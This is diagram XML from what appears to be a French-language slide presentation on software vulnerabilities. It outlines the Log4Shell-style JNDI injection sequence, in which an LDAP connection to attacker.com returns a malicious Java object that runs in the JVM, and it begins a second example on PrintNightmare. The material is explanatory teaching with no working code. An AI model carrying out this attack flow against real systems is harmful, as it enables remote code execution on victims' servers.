    <dgm:pt modelId="{466DD4A1-2280-9C42-A183-6AC2A086BB4D}" type="pres">
      <dgm:prSet presAssocID="{126DA113-6B2B-49E1-B1E9-94323D23494C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B7A49A28-272E-8C4C-9377-3FE341BBFF2A}" type="pres">
      <dgm:prSet presAssocID="{126DA113-6B2B-49E1-B1E9-94323D23494C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2AC0670E-BFB1-104C-8038-458371C5F8BC}" type="presOf" srcId="{BE78065D-6440-4AA0-8724-21316DA4FBC0}" destId="{02C00511-8A88-1E4B-8F31-67079EE03038}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{47DAC719-CE46-ED44-8A7D-461720CE6774}" type="presOf" srcId="{45E4EAF3-A73F-4154-9041-8B6D4CB35FD8}" destId="{00254EF7-15EC-974F-BFC7-605524315E56}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{D42E7E20-22D1-4FFD-8AD7-0C2956581E6A}" srcId="{45E4EAF3-A73F-4154-9041-8B6D4CB35FD8}" destId="{126DA113-6B2B-49E1-B1E9-94323D23494C}" srcOrd="2" destOrd="0" parTransId="{42EDB878-0F22-422A-8E77-627888CAE623}" sibTransId="{3267ADD6-44EB-4265-B389-24E687EC7A9D}"/>
    <dgm:cxn modelId="{C6571825-A3F5-4617-98AE-9E36BAAF3854}" srcId="{45E4EAF3-A73F-4154-9041-8B6D4CB35FD8}" destId="{BE78065D-6440-4AA0-8724-21316DA4FBC0}" srcOrd="0" destOrd="0" parTransId="{5FC9370E-3B74-4D8F-9A7E-16ABB0690666}" sibTransId="{4BD24608-B4FF-4F86-A659-EDF47822E711}"/>
    <dgm:cxn modelId="{5FFD2A3B-EE27-0048-95B7-59A050F3C6C2}" type="presOf" srcId="{E16A359C-F1D6-4E6C-A744-36441E9A68AB}" destId="{11BC0BEC-B366-FE47-8B1A-F03D8F090FD4}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{33A14F4B-6185-2E4E-A6D5-80CF74C50FCA}" type="presOf" srcId="{16F36751-F815-4463-9F85-7E3744F1A164}" destId="{4E82014A-B7A3-DA4D-BC04-53B4F64590F7}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{D28F0157-BC51-4ACD-BFED-5D7A4D8901B5}" srcId="{126DA113-6B2B-49E1-B1E9-94323D23494C}" destId="{84CE5E48-AB2A-42C2-8E5F-13CBBB0B473E}" srcOrd="0" destOrd="0" parTransId="{80B991AD-9F31-4E49-8763-E2128C401F6D}" sibTransId="{4ABCFACC-5368-4FB7-93F5-56FD4FEA1D7D}"/>
    <dgm:cxn modelId="{D6185A5C-516C-EF45-A996-5E7AEAAB6712}" type="presOf" srcId="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411}" destId="{2A925559-860F-D74D-9EF0-87C652373DFD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{F787BF5F-9611-4053-AF6F-9541EB5000F9}" srcId="{BE78065D-6440-4AA0-8724-21316DA4FBC0}" destId="{E16A359C-F1D6-4E6C-A744-36441E9A68AB}" srcOrd="0" destOrd="0" parTransId="{29B83B8A-7EA3-4119-885F-EC2E6CC0701B}" sibTransId="{7B5542A6-C485-4A1E-8A08-4ADA13B660C4}"/>
    <dgm:cxn modelId="{0B25DB74-B4C2-46C6-BD83-8A9B993BC0F0}" srcId="{45E4EAF3-A73F-4154-9041-8B6D4CB35FD8}" destId="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411}" srcOrd="1" destOrd="0" parTransId="{B0B1DA5E-6591-4FF4-BE1D-39EFB5730303}" sibTransId="{C4E48107-2212-4DC4-8194-A80326EB06A2}"/>
    <dgm:cxn modelId="{A324B990-B879-C74F-98F2-5D90311088BD}" type="presOf" srcId="{126DA113-6B2B-49E1-B1E9-94323D23494C}" destId="{466DD4A1-2280-9C42-A183-6AC2A086BB4D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{346E51CF-F7CA-5348-BB28-69464107566E}" type="presOf" srcId="{84CE5E48-AB2A-42C2-8E5F-13CBBB0B473E}" destId="{B7A49A28-272E-8C4C-9377-3FE341BBFF2A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{F97FCBE0-040E-4CAF-8137-FFD31EFC255C}" srcId="{1A37CD49-31A0-479A-A85C-9CBE8C4FF411}" destId="{16F36751-F815-4463-9F85-7E3744F1A164}" srcOrd="0" destOrd="0" parTransId="{38281167-FEE9-4659-8694-2FD46A078D53}" sibTransId="{E8E4E516-C330-4556-ACA7-0128CDA3F5F5}"/>
    <dgm:cxn modelId="{91B1D2D0-D72D-5E42-B331-8EC536622752}" type="presParOf" srcId="{00254EF7-15EC-974F-BFC7-605524315E56}" destId="{054398D7-EDAD-4A40-B3FD-3F0E8D489498}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{600AF070-893C-304D-88FE-4A3F9A53C57C}" type="presParOf" srcId="{054398D7-EDAD-4A40-B3FD-3F0E8D489498}" destId="{02C00511-8A88-1E4B-8F31-67079EE03038}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{CAB87543-85C7-6748-8F8F-248B0800E3BA}" type="presParOf" srcId="{054398D7-EDAD-4A40-B3FD-3F0E8D489498}" destId="{11BC0BEC-B366-FE47-8B1A-F03D8F090FD4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{D1887B45-DBD2-F64D-A1FB-A5AF9E8EA3C8}" type="presParOf" srcId="{00254EF7-15EC-974F-BFC7-605524315E56}" destId="{8982072D-1CE6-CE4B-B088-B2EC7F5BA439}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{C7558C06-4F19-1547-8E59-15FBFE6959F8}" type="presParOf" srcId="{00254EF7-15EC-974F-BFC7-605524315E56}" destId="{D53CA4A9-A9E6-DC45-9B3B-D38459F9CD71}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{90036571-4C48-ED40-9C09-DB107373C879}" type="presParOf" srcId="{D53CA4A9-A9E6-DC45-9B3B-D38459F9CD71}" destId="{2A925559-860F-D74D-9EF0-87C652373DFD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{8881980A-DC96-1940-BDB7-E2870AAF0C02}" type="presParOf" srcId="{D53CA4A9-A9E6-DC45-9B3B-D38459F9CD71}" destId="{4E82014A-B7A3-DA4D-BC04-53B4F64590F7}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{A5E8F445-A48C-7F46-B101-2B0FB8FED787}" type="presParOf" srcId="{00254EF7-15EC-974F-BFC7-605524315E56}" destId="{ECDA30CA-8D15-6B4C-8BCD-E9D36273660D}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{6560B0AD-0897-D547-87C0-C70423FD124D}" type="presParOf" srcId="{00254EF7-15EC-974F-BFC7-605524315E56}" destId="{109452D9-34C9-C049-809A-2C7CF503E7E3}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{DC5F5BB9-D69A-F74F-A15F-ED6098422850}" type="presParOf" srcId="{109452D9-34C9-C049-809A-2C7CF503E7E3}" destId="{466DD4A1-2280-9C42-A183-6AC2A086BB4D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2016/7/layout/VerticalSolidActionList"/>
    <dgm:cxn modelId="{0FAC76DB-AD9F-1645-A165-EB38D377EBF0}" type="presParOf" srcId="{109452D9-34C9-C049-809A-2C7CF503E7E3}" destId="{B7A49A28-272E-8C4C-9377-3FE341BBFF2A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D40EAEC-8D75-4B5B-A50F-A67DA1A605C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82518A9-D4EA-496C-9328-04C2205D931F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Requête envoyée :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{91589B78-3AE0-46FC-BF05-9569C629C3F1}" type="parTrans" cxnId="{340219C4-0B46-4C47-8A96-C34F161A24D0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8B564D9D-AF15-438E-B345-DEF57086E5F7}" type="sibTrans" cxnId="{340219C4-0B46-4C47-8A96-C34F161A24D0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{67BD0261-A52E-422B-B2A4-1DB77A2D9450}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>JNDI établit une connexion LDAP à attacker.com.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3B8EF9C2-084F-40C7-954D-6ED6A0009AEB}" type="parTrans" cxnId="{27578048-3079-4921-98EF-4347101CAD43}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8D6337C5-487B-456C-911A-361C077542D3}" type="sibTrans" cxnId="{27578048-3079-4921-98EF-4347101CAD43}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{23C9A853-1F30-493E-9B3C-FF8550F431D2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Réponse de l’attaquant :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B7E6A4F7-D55F-4E4C-8718-39A9FC16AB47}" type="parTrans" cxnId="{97A17D06-9952-4E99-AD37-F68CABDBCAB0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2537805A-2EC8-4F31-940A-CD475238A28C}" type="sibTrans" cxnId="{97A17D06-9952-4E99-AD37-F68CABDBCAB0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9CB55C78-AD2A-4205-9D0B-C8FFA0C06035}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Fournit une référence Java malveillante.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5EF64158-FEAA-4DAF-99C0-515F440F6FE2}" type="parTrans" cxnId="{D870D5EF-07F1-4A1E-A97B-7670FE280D4D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{61DA7D8B-9F4B-46FF-9FC2-219E58E83848}" type="sibTrans" cxnId="{D870D5EF-07F1-4A1E-A97B-7670FE280D4D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{29CF12F9-A19A-4AFA-B535-132B541383A5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Chargement en mémoire :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{72C2C1EE-64A5-49DE-A368-652B425B1DAB}" type="parTrans" cxnId="{D69AD64F-EF75-4878-95B9-423C95EE6BFE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A4A40985-1119-4A16-A2FB-1FFD6178D799}" type="sibTrans" cxnId="{D69AD64F-EF75-4878-95B9-423C95EE6BFE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EECD2787-07A0-484D-9133-EB30A1C572F2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>L’objet est injecté dans la JVM.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC262805-E069-46C2-8CFC-9A8E00E2038B}" type="parTrans" cxnId="{3FC29419-C7E4-43EE-992B-81D13DBFE2B7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8541EDA7-84F6-4DE3-ACAC-8F92478C382B}" type="sibTrans" cxnId="{3FC29419-C7E4-43EE-992B-81D13DBFE2B7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{ADF401C6-A427-41FC-95FF-A5304355CDA7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exécution :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5FECA892-BEE3-4994-A13F-A01DC3AE3F0E}" type="parTrans" cxnId="{3A556AE5-6341-4C82-BE3D-70FFA6C40937}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A6E98378-B36B-496B-9097-D186FEB80213}" type="sibTrans" cxnId="{3A556AE5-6341-4C82-BE3D-70FFA6C40937}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0EB5734E-7956-416C-98A6-2C25B826ECEF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Les méthodes de l’objet malveillant s’exécutent.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C134C9CF-8474-43F7-9625-7424AF9FBA1A}" type="parTrans" cxnId="{39F7DD44-0F51-4275-A91B-58EEB7537D32}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{473501EB-E14F-4C34-A5BF-B13875686126}" type="sibTrans" cxnId="{39F7DD44-0F51-4275-A91B-58EEB7537D32}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" type="pres">
      <dgm:prSet presAssocID="{9D40EAEC-8D75-4B5B-A50F-A67DA1A605CB}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E2BD9E75-122D-274F-BFF1-B98D6BA652CC}" type="pres">
      <dgm:prSet presAssocID="{282518A9-D4EA-496C-9328-04C2205D93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F823EFE-03EE-CE47-B2FA-809C800AC26E}" type="pres">
      <dgm:prSet presAssocID="{282518A9-D4EA-496C-9328-04C2205D931F}" presName="childText" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B7E9DADF-A63E-4248-9FB3-900A4E669D48}" type="pres">
      <dgm:prSet presAssocID="{23C9A853-1F30-493E-9B3C-FF8550F431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0A77BB7-CE23-0449-989A-FB73371B6954}" type="pres">
      <dgm:prSet presAssocID="{23C9A853-1F30-493E-9B3C-FF8550F431D2}" presName="childText" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CB496DC4-B639-0649-86E1-F85924EEF741}" type="pres">
      <dgm:prSet presAssocID="{29CF12F9-A19A-4AFA-B535-132B541383A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5BA686C-D245-2F4B-9A3A-79EC567242A1}" type="pres">
      <dgm:prSet presAssocID="{29CF12F9-A19A-4AFA-B535-132B541383A5}" presName="childText" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2E7F8177-F5A8-F245-BAAA-5C111247D041}" type="pres">
      <dgm:prSet presAssocID="{ADF401C6-A427-41FC-95FF-A5304355CDA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5113E57-A351-F143-ADD5-C61FF1B5DF00}" type="pres">
      <dgm:prSet presAssocID="{ADF401C6-A427-41FC-95FF-A5304355CDA7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97A17D06-9952-4E99-AD37-F68CABDBCAB0}" srcId="{9D40EAEC-8D75-4B5B-A50F-A67DA1A605CB}" destId="{23C9A853-1F30-493E-9B3C-FF8550F431D2}" srcOrd="1" destOrd="0" parTransId="{B7E6A4F7-D55F-4E4C-8718-39A9FC16AB47}" sibTransId="{2537805A-2EC8-4F31-940A-CD475238A28C}"/>
    <dgm:cxn modelId="{C2F28C0D-3284-5141-BCE0-2EAA5DCD22C9}" type="presOf" srcId="{282518A9-D4EA-496C-9328-04C2205D931F}" destId="{E2BD9E75-122D-274F-BFF1-B98D6BA652CC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{3FC29419-C7E4-43EE-992B-81D13DBFE2B7}" srcId="{29CF12F9-A19A-4AFA-B535-132B541383A5}" destId="{EECD2787-07A0-484D-9133-EB30A1C572F2}" srcOrd="0" destOrd="0" parTransId="{BC262805-E069-46C2-8CFC-9A8E00E2038B}" sibTransId="{8541EDA7-84F6-4DE3-ACAC-8F92478C382B}"/>
    <dgm:cxn modelId="{36BB6B29-25E6-594B-9414-EE593287D53C}" type="presOf" srcId="{ADF401C6-A427-41FC-95FF-A5304355CDA7}" destId="{2E7F8177-F5A8-F245-BAAA-5C111247D041}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{0B558739-7A5C-AE43-9977-3AA5C05A8674}" type="presOf" srcId="{67BD0261-A52E-422B-B2A4-1DB77A2D9450}" destId="{6F823EFE-03EE-CE47-B2FA-809C800AC26E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{39F7DD44-0F51-4275-A91B-58EEB7537D32}" srcId="{ADF401C6-A427-41FC-95FF-A5304355CDA7}" destId="{0EB5734E-7956-416C-98A6-2C25B826ECEF}" srcOrd="0" destOrd="0" parTransId="{C134C9CF-8474-43F7-9625-7424AF9FBA1A}" sibTransId="{473501EB-E14F-4C34-A5BF-B13875686126}"/>
    <dgm:cxn modelId="{27578048-3079-4921-98EF-4347101CAD43}" srcId="{282518A9-D4EA-496C-9328-04C2205D931F}" destId="{67BD0261-A52E-422B-B2A4-1DB77A2D9450}" srcOrd="0" destOrd="0" parTransId="{3B8EF9C2-084F-40C7-954D-6ED6A0009AEB}" sibTransId="{8D6337C5-487B-456C-911A-361C077542D3}"/>
    <dgm:cxn modelId="{D69AD64F-EF75-4878-95B9-423C95EE6BFE}" srcId="{9D40EAEC-8D75-4B5B-A50F-A67DA1A605CB}" destId="{29CF12F9-A19A-4AFA-B535-132B541383A5}" srcOrd="2" destOrd="0" parTransId="{72C2C1EE-64A5-49DE-A368-652B425B1DAB}" sibTransId="{A4A40985-1119-4A16-A2FB-1FFD6178D799}"/>
    <dgm:cxn modelId="{FDF16752-5FDC-9E44-B0FF-6EA5FB254911}" type="presOf" srcId="{23C9A853-1F30-493E-9B3C-FF8550F431D2}" destId="{B7E9DADF-A63E-4248-9FB3-900A4E669D48}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{7460D65D-8160-CF4B-A2D5-E52A3FA78766}" type="presOf" srcId="{29CF12F9-A19A-4AFA-B535-132B541383A5}" destId="{CB496DC4-B639-0649-86E1-F85924EEF741}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{E65C068B-F485-1043-A15F-5E0ECE284588}" type="presOf" srcId="{EECD2787-07A0-484D-9133-EB30A1C572F2}" destId="{85BA686C-D245-2F4B-9A3A-79EC567242A1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{902DEE9D-25FB-CC46-ADC1-A4A02F7EEED9}" type="presOf" srcId="{0EB5734E-7956-416C-98A6-2C25B826ECEF}" destId="{45113E57-A351-F143-ADD5-C61FF1B5DF00}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{340219C4-0B46-4C47-8A96-C34F161A24D0}" srcId="{9D40EAEC-8D75-4B5B-A50F-A67DA1A605CB}" destId="{282518A9-D4EA-496C-9328-04C2205D931F}" srcOrd="0" destOrd="0" parTransId="{91589B78-3AE0-46FC-BF05-9569C629C3F1}" sibTransId="{8B564D9D-AF15-438E-B345-DEF57086E5F7}"/>
    <dgm:cxn modelId="{3A556AE5-6341-4C82-BE3D-70FFA6C40937}" srcId="{9D40EAEC-8D75-4B5B-A50F-A67DA1A605CB}" destId="{ADF401C6-A427-41FC-95FF-A5304355CDA7}" srcOrd="3" destOrd="0" parTransId="{5FECA892-BEE3-4994-A13F-A01DC3AE3F0E}" sibTransId="{A6E98378-B36B-496B-9097-D186FEB80213}"/>
    <dgm:cxn modelId="{DEBAD9ED-6153-244B-821E-BC2F37CD2CA4}" type="presOf" srcId="{9CB55C78-AD2A-4205-9D0B-C8FFA0C06035}" destId="{B0A77BB7-CE23-0449-989A-FB73371B6954}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D870D5EF-07F1-4A1E-A97B-7670FE280D4D}" srcId="{23C9A853-1F30-493E-9B3C-FF8550F431D2}" destId="{9CB55C78-AD2A-4205-9D0B-C8FFA0C06035}" srcOrd="0" destOrd="0" parTransId="{5EF64158-FEAA-4DAF-99C0-515F440F6FE2}" sibTransId="{61DA7D8B-9F4B-46FF-9FC2-219E58E83848}"/>
    <dgm:cxn modelId="{BB2A0CF6-07E9-0447-A30A-DC9CB4810431}" type="presOf" srcId="{9D40EAEC-8D75-4B5B-A50F-A67DA1A605CB}" destId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{BEEAA82F-0C04-354D-BFF3-37E3B6A1467D}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{E2BD9E75-122D-274F-BFF1-B98D6BA652CC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{66D7F80D-1462-2045-BD57-0A66F3535CAF}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{6F823EFE-03EE-CE47-B2FA-809C800AC26E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{28336B76-BE28-8A47-94D8-1A09C873472B}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{B7E9DADF-A63E-4248-9FB3-900A4E669D48}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{5A9B28D9-5799-1546-B118-F99C67AAC905}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{B0A77BB7-CE23-0449-989A-FB73371B6954}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{34ABF0DC-DD8C-B046-9BEA-A8F2D30C9538}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{CB496DC4-B639-0649-86E1-F85924EEF741}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{84356AEF-2D86-DE47-B43D-006BBEBBCED6}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{85BA686C-D245-2F4B-9A3A-79EC567242A1}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{FC2B39A4-61F1-0847-BA02-484B9AC79782}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{2E7F8177-F5A8-F245-BAAA-5C111247D041}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{F4D4DFA5-501A-7E47-95A8-B5502FB4F32D}" type="presParOf" srcId="{B64F25CB-3F6E-3A49-B983-802377BCB4B3}" destId="{45113E57-A351-F143-ADD5-C61FF1B5DF0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3BDEEC6-E2E2-4CE5-B803-A4809AE8F83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BEA87B8-5F4A-4D2C-84D4-FE20382350FF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exemple 2 : PrintNightmare (2021)</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
